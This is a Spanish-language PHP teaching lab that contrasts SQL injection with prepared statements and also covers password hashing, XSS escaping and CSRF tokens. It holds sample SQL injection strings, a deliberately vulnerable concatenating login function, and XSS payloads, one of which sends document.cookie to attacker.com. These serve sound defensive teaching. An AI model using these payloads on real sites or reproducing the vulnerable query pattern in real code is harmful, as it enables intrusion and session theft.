<?php

declare(strict_types=1);

/**
 * LAB 06: PDO y Seguridad en PHP
 * ================================
 * Ejecutar: php labs/php/06_pdo_security.php
 *
 * NOTA: Este lab NO necesita conexión real a BD.
 * Demuestra conceptos de seguridad con datos simulados.
 *
 * Cubre: SQL Injection (demostración visual), prepared statements,
 * password hashing, XSS prevention, CSRF tokens.
 */

function separator(string $title): void {
    echo "\n" . str_repeat('═', 60) . "\n  {$title}\n" . str_repeat('═', 60) . "\n";
}

// ════════════════════════════════════════════════════════════════════════════
separator('🔬 EXPERIMENTO 1: SQL Injection — demostración visual');
// ════════════════════════════════════════════════════════════════════════════
// ❌ NO HAGAS ESTO: construir queries con concatenación de strings
// ✅ MEJOR ASÍ: usar Prepared Statements con placeholders (? o :param)

// Simulamos un login VULNERABLE (❌ nunca hagas esto)
function vulnerableLogin(string $email, string $password): string {
    // ❌ JAMÁS concatenes input del usuario en SQL
    $sql = "SELECT * FROM users WHERE email = '{$email}' AND password = '{$password}'";
    return $sql;
}

// Simulamos un login SEGURO con prepared statement
function safeLogin(string $email, string $password): string {
    // ✅ Los placeholders ? son seguros: el valor NUNCA forma parte del SQL
    $sql = "SELECT * FROM users WHERE email = ? AND password_hash = ?";
    return $sql . " [params: " . json_encode([$email, password_hash($password, PASSWORD_BCRYPT)]) . "]";
}

$userInput = [
    ['email' => 'admin@lab.test', 'password' => 'password123', 'label' => 'Input normal'],
    ['email' => "admin@lab.test' OR '1'='1", 'password' => "' OR '1'='1", 'label' => '⚠️  SQL Injection'],
    ['email' => "admin@lab.test'; DROP TABLE users;--", 'password' => 'x', 'label' => '💣 DROP TABLE attack'],
    ['email' => "' UNION SELECT 1,username,password FROM admin--", 'password' => 'x', 'label' => '🔓 UNION attack'],
];

echo "\n  Comparación de queries (simuladas, sin BD real):\n\n";
foreach ($userInput as $input) {
    echo "  [{$input['label']}]\n";
    echo "  ❌ Vulnerable: " . vulnerableLogin($input['email'], $input['password']) . "\n";
    echo "  ✅ Seguro:     " . safeLogin($input['email'], $input['password']) . "\n\n";
}

// ════════════════════════════════════════════════════════════════════════════
separator('🔬 EXPERIMENTO 2: Prepared Statements explicados');
// ════════════════════════════════════════════════════════════════════════════

echo "\n  Cómo funcionan los Prepared Statements internamente:\n\n";
echo "  1. PREPARE: El servidor SQL parsea la query con placeholders\n";
echo "     SQL: SELECT * FROM users WHERE email = ? AND role = ?\n";
echo "     → El servidor crea un plan de ejecución SIN los valores\n\n";
echo "  2. BIND: Los valores se envían SEPARADOS del SQL\n";
echo "     Valor 1: 'admin@lab.test' (tipo: string)\n";
echo "     Valor 2: 'admin' (tipo: string)\n\n";
echo "  3. EXECUTE: El servidor ejecuta el plan con los valores enlazados\n";
echo "     → Los valores NUNCA se interpretan como SQL\n";
echo "     → 'admin@lab.test' OR 1=1 se busca LITERALMENTE en la BD\n\n";

echo "  Ejemplo con named parameters (:param):\n";
echo "  SQL: INSERT INTO users (name, email, role) VALUES (:name, :email, :role)\n";
echo "  Params: [':name' => 'Carlos', ':email' => 'carlos@lab.test', ':role' => 'user']\n";
echo "  → Más legible que ?, especialmente con muchos parámetros\n";

// ════════════════════════════════════════════════════════════════════════════
separator('🔬 EXPERIMENTO 3: Password Hashing — algoritmos y tiempos');
// ════════════════════════════════════════════════════════════════════════════
// ❌ NO HAGAS ESTO: md5(), sha1(), sha256() para contraseñas
// ✅ MEJOR ASÍ: password_hash() con PASSWORD_ARGON2ID o PASSWORD_BCRYPT

$password = 'MiContraseñaSegura123!'; // 👉 MODIFICA: cambia la contraseña

echo "\n  Algoritmos de hashing (NUNCA uses los dos primeros para contraseñas):\n\n";

// ❌ Estos son INSEGUROS para contraseñas (rápidos = malos para contraseñas)
$start = microtime(true);
$md5 = md5($password);
$tMd5 = round((microtime(true) - $start) * 1000000, 2);
echo "  ❌ MD5      ({$tMd5}μs): {$md5}\n";

$start = microtime(true);
$sha1 = sha1($password);
$tSha1 = round((microtime(true) - $start) * 1000000, 2);
echo "  ❌ SHA1     ({$tSha1}μs): {$sha1}\n";

// ✅ Estos son SEGUROS para contraseñas (lentos intencionalmente)
$start = microtime(true);
$bcrypt = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]); // 👉 MODIFICA: cost 4-31
$tBcrypt = round((microtime(true) - $start) * 1000, 2);
echo "\n  ✅ BCrypt   ({$tBcrypt}ms): {$bcrypt}\n";

$start = microtime(true);
$argon = password_hash($password, PASSWORD_ARGON2ID, ['memory_cost' => 65536, 'time_cost' => 4]);
$tArgon = round((microtime(true) - $start) * 1000, 2);
echo "  ✅ Argon2ID ({$tArgon}ms): {$argon}\n";

echo "\n  Velocidad (μs) hace a MD5/SHA1 triviales de atacar por fuerza bruta.\n";
echo "  Lentitud (ms)  hace a BCrypt/Argon2ID extremadamente difíciles.\n\n";

// Verificación
$hash = password_hash($password, PASSWORD_ARGON2ID);
echo "  Verificación:\n";
echo "  password_verify(correcto, hash): " . (password_verify($password, $hash) ? '✅ true' : '❌ false') . "\n";
echo "  password_verify(incorrecto, hash): " . (password_verify('otraContraseña', $hash) ? '❌ true' : '✅ false') . "\n";

// password_needs_rehash: detecta si el hash está desactualizado
echo "  needs_rehash (cost=12): " . (password_needs_rehash($hash, PASSWORD_ARGON2ID, ['time_cost' => 100]) ? 'Sí' : 'No') . "\n";

// ════════════════════════════════════════════════════════════════════════════
separator('🔬 EXPERIMENTO 4: XSS Prevention');
// ════════════════════════════════════════════════════════════════════════════
// XSS (Cross-Site Scripting): inyectar scripts maliciosos en HTML.
// ❌ NO HAGAS ESTO: echo $_GET['input'];
// ✅ MEJOR ASÍ: echo htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

$maliciousInputs = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">',
    '"><script>document.location="https://phishing.com"</script>',
    "'; DROP TABLE users; --",
    '<svg onload=alert(1)>',
];

echo "\n  XSS Prevention con htmlspecialchars():\n\n";
foreach ($maliciousInputs as $input) {
    $safe = htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    echo "  ❌ Input:   {$input}\n";
    echo "  ✅ Seguro:  {$safe}\n\n";
}

// strip_tags: elimina todas las etiquetas HTML
$withHtml = '<b>Texto en negrita</b> con <script>alert(1)</script>';
echo "  strip_tags: " . strip_tags($withHtml) . "\n";
echo "  strip_tags (permitir <b>): " . strip_tags($withHtml, ['b']) . "\n";

// ════════════════════════════════════════════════════════════════════════════
separator('🔬 EXPERIMENTO 5: CSRF Tokens');
// ════════════════════════════════════════════════════════════════════════════
// CSRF (Cross-Site Request Forgery): engañar al usuario para que haga
// una acción no deseada en un sitio donde está autenticado.
// Solución: incluir un token único y secreto en cada formulario.

class CsrfProtection
{
    private string $token;

    public function __construct(private string $secret)
    {
        $this->token = $this->generateToken();
    }

    public function generateToken(): string
    {
        // Token aleatorio de 32 bytes en hex (64 chars)
        return bin2hex(random_bytes(32));
    }

    public function getToken(): string
    {
        return $this->token;
    }

    public function validateToken(string $submittedToken): bool
    {
        // ✅ Comparación constante de tiempo para prevenir timing attacks
        return hash_equals($this->token, $submittedToken);
    }

    public function getHiddenField(): string
    {
        return "<input type=\"hidden\" name=\"_csrf\" value=\"{$this->token}\">";
    }
}

$csrf = new CsrfProtection('mi-secret-de-app');
$token = $csrf->getToken();

echo "\n  Flujo de protección CSRF:\n\n";
echo "  1. Servidor genera token único por sesión:\n";
echo "     Token: {$token}\n\n";
echo "  2. Token incluido en el formulario como campo oculto:\n";
echo "     " . $csrf->getHiddenField() . "\n\n";
echo "  3. Validación al recibir el formulario:\n";
echo "     Token correcto: " . ($csrf->validateToken($token) ? '✅ Válido' : '❌ Inválido') . "\n";
echo "     Token incorrecto: " . ($csrf->validateToken('fake-token') ? '✅ Válido' : '❌ Inválido — rechazar petición') . "\n";

echo "\n\n  ✅ Lab 06 completado. La seguridad es responsabilidad del desarrollador.\n\n";
